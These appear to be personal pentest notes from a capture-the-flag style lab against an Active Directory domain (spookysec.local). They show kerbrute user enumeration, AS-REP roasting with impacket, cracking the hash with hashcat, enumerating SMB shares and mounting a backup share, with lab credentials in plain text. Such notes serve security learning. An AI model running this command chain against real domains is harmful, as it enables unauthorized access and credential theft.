# Attack AD

## kerberos user enum


*kerbrute*
[ropnop/kerbrute: A tool to perform Kerberos pre-auth bruteforcing (github.com)](https://github.com/ropnop/kerbrute)

```bash


./kerbrute  userenum -d spookysec.local userlist.txt  -t 20  --dc 10.10.152.211

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/11/21 - Ronnie Flathers @ropnop

2021/12/11 20:02:56 >  Using KDC(s):
2021/12/11 20:02:56 >  	10.10.152.211:88


2021/12/11 20:02:56 >  [+] VALID USERNAME:	 james@spookysec.local
2021/12/11 20:02:56 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2021/12/11 20:02:56 >  [+] VALID USERNAME:	 James@spookysec.local
2021/12/11 20:02:56 >  [+] VALID USERNAME:	 robin@spookysec.local
2021/12/11 20:02:57 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2021/12/11 20:02:58 >  [+] VALID USERNAME:	 administrator@spookysec.local
2021/12/11 20:02:59 >  [+] VALID USERNAME:	 backup@spookysec.local
2021/12/11 20:03:00 >  [+] VALID USERNAME:	 paradox@spookysec.local
2021/12/11 20:03:05 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2021/12/11 20:03:06 >  [+] VALID USERNAME:	 Robin@spookysec.local
2021/12/11 20:03:14 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2021/12/11 20:03:32 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2021/12/11 20:03:37 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2021/12/11 20:03:55 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2021/12/11 20:04:00 >  [+] VALID USERNAME:	 ori@spookysec.local
2021/12/11 20:04:10 >  [+] VALID USERNAME:	 ROBIN@spookysec.local

```

## ASREPRoasting

*impacket*

```bash
python3 GetNPUsers.py -format hashcat -dc-ip 10.10.152.211 spookysec.local/svc-admin -no-pass
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a68025e290f3db1897c9f68179932f85$b1745abe6fe93fd352779e70308338bc7375ba58648b6a01a5b09b68318e6aa00f4e473868a3b37d2263d61d8b0bf0eecdc5c90e70790d1f64b3716cf7113dff9d17bbfabd1fe4aabe8ca72800e91f3384b945918181ae69c710c97b17724730bb6e0e470227ecf75c69fa03c133cac660be2990aa162dcf64cba52b85cd05b7d749193721650ee4f00914a2d92a4ef548f1dda09b0c5689ce58ac68c0c1ed82b7ca522a08eaead4c1c70b618b4a20a524201a6fda68f51a342d790cd52f323bab7bae5d375601cacdc67b970a52cf777bcd5ccb8cbc120235062e5773eaa2400c69e02d3cb7931f1b474b7e26e6f78e7c5c

```



### cracking hash

```bash

hashcat -m 18200 -a 0 svc passwordlist.txt 

Host memory required for this attack: 35 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:284786bf8a5259e589f6da61073548a6$e445f63d97fde5db0554b7213b60eb0d1b8284d442ebb1319f0b234dcf959b06a8fa9970df6b8bdc1bd03ae103e3f09076dc15e01b4a0563f6b978e3752d9ba26b1f62116098d1042b020ed90120ed9785723168fff2fe5e70191b59382079165313912721a5c4f5e517dc8a7734d1740f8777f922b0629731a0e7ae2f67f8f01c85227c6d3da2834dd151cee495cfb24a5cbecbc815bdaaf0302ab84815546b5ecb892c02cf06b281e94af779fcd05ae33a29fc6f41336cd6de15a683f5dbe0f2e420c261aa9e94ddfa70e02efbd0f5552e74ad558594c45e9125824e08e3784c43d9fa26fe032fbdf5acd63e484c6f41cd:management2005


```




### SMB 
*smbmap*

```bash
python3 smbmap.py -u svc-admin -p management2005  -H 10.10.152.211 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   
                     https://github.com/ShawnDEvans/smbmap

                                                                                                    
[+] IP: 10.10.152.211:445	Name: spookysec.local     	Status: Authenticated
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 

```



```bash
mount -t cifs -o 'username=svc-admin,password=management2005' //10.10.152.211/backup/ /mnt/smb
```

```text
backup@spookysec.local:backup2517860
```








## Resource
[139,445 - Pentesting SMB - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-smb)
